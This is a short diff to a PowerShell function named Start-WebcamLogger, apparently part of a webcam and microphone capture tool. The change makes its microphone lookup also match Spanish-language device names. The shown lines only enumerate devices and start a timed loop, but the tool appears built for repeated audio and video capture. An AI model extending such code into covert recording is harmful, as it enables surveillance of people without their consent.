@@ -68,7 +68,7 @@ function Start-WebcamLogger{
     
     $count = 0;
     $cam = (Get-CimInstance Win32_PnPEntity | Where-Object { $_.Service -eq "usbvideo" })[0].name;
-    $mic = (Get-CimInstance Win32_PnPEntity | Where-Object { $_.Name -like "*Microphone*" })[0].name;
+    $mic = (Get-CimInstance Win32_PnPEntity | Where-Object {($_.Name -like "*Microphone*") -or ($_.Name -like "*Micrófono*")})[0].name;
     
     while($count -ne $TimesRun){
         $time = Get-Date -Format "ddMMyyyyHHmm";
